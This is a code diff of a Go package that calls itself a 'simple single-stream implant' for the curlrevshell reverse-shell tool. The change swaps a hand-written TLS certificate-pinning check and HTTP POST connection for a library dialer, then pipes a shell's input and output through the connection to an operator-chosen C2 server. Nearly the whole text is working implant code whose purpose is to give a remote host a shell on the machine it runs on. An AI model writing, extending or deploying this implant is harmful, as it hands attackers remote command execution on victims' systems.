@@ -6,21 +6,18 @@ package simpleshell
  * Simple single-stream implant
  * By J. Stuart McMurray
  * Created 20241003
- * Last Modified 20241013
+ * Last Modified 20250905
  */
 
 import (
 	"context"
-	"crypto/sha256"
-	"crypto/subtle"
-	"crypto/tls"
-	"crypto/x509"
-	"encoding/base64"
 	"errors"
 	"fmt"
-	"net/http"
+	"io"
 	"os/exec"
 	"strings"
+
+	"github.com/magisterquis/curlrevshell/lib/crsdialer"
 )
 
 const (
@@ -68,84 +65,22 @@ func GoSimple(ctx context.Context, c2, fingerprint string, args []string) error 
 
 // Go connects a Shell to Curlrevshell.
 func Go(ctx context.Context, conf ConnConfig, shell Shell) error {
-	/* Roll an HTTP client. */
-	client := http.DefaultClient
-	/* Add fingerprint verification if we have it. */
-	if "" != conf.Fingerprint {
-		vfp, err := TLSFingerprintVerifier(conf.Fingerprint)
-		if nil != err {
-			return fmt.Errorf(
-				"setting up TLS fingerprint verification: %w",
-				err,
-			)
-		}
-		transport := http.DefaultTransport.(*http.Transport).Clone()
-		transport.TLSClientConfig = &tls.Config{
-			InsecureSkipVerify: true,
-			VerifyConnection:   vfp,
-		}
-		transport.ForceAttemptHTTP2 = true
-		client.Transport = transport
-	}
+	defer shell.Output().Close()
 
-	/* Connect to CRS. */
-	res, err := client.Post(conf.C2, "", shell.Output())
+	/* Connect to curlrevshell. */
+	svr, err := crsdialer.Dial(ctx, conf.C2, conf.Fingerprint)
 	if nil != err {
-		return fmt.Errorf("connecting to %s: %w", conf.C2, err)
+		return fmt.Errorf("connecting to server: %w", err)
 	}
 
 	/* Do shell things. */
-	shell.SetInput(res.Body)
+	go func() { io.Copy(svr, shell.Output()) }()
+	shell.SetInput(svr)
 	if err := shell.Go(ctx); nil != err {
 		return fmt.Errorf("running %s: %w", shell, err)
 	}
 
 	return nil
-}
-
-// TLSFingerprintVerifier returns a function which can be used for
-// [tls.Config.VerifyConnection].  It ensures the peer presents a certificate
-// with the given fingerprint, which must be a base64-encoded sha256 hash as
-// used by curl, with or without the leading sha256//.
-func TLSFingerprintVerifier(fp string) (
-	func(tls.ConnectionState) error,
-	error,
-) {
-	/* Make sure the fingerprint looks correct. */
-	wantFP, err := base64.StdEncoding.DecodeString(
-		strings.TrimPrefix(fp, "sha256//"),
-	)
-	if nil != err {
-		return nil, fmt.Errorf("decoding fingerprint: %w", err)
-	}
-	if 32 != len(wantFP) {
-		return nil, fmt.Errorf("decoded fingerprint not 32 bytes")
-	}
-
-	/* Return a function to check if any of the certs in
-	cs.PeerCertificates have the right hash. */
-	return func(cs tls.ConnectionState) error {
-		/* Check ALL the certs. */
-		for i, cert := range cs.PeerCertificates {
-			/* Hash the cert. */
-			b, err := x509.MarshalPKIXPublicKey(cert.PublicKey)
-			if nil != err {
-				return fmt.Errorf(
-					"marshalling peer certificate "+
-						"%d/%d to DER: %w",
-					i+1, len(cs.PeerCertificates),
-					err,
-				)
-			}
-			h := sha256.Sum256(b)
-
-			/* See if it matches. */
-			if 1 == subtle.ConstantTimeCompare(wantFP, h[:]) {
-				return nil
-			}
-		}
-		return ErrNoMatchingCertificate
-	}, nil
 }
 
 // SplitArgs splits s into a slice of strings using the first rune in s as the
